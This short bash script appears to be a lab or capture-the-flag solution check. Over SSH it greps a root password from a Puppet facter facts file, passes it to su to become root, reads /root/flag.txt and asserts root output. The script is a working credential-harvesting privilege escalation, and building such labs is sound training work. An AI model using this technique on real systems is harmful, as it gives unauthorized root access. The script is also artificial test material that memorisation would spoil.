#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
PASS=$(grep -o "\"root_password\":\"[^\"]*\"" /etc/facter/facts.d/root_pass.json | cut -d\" -f4)
printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
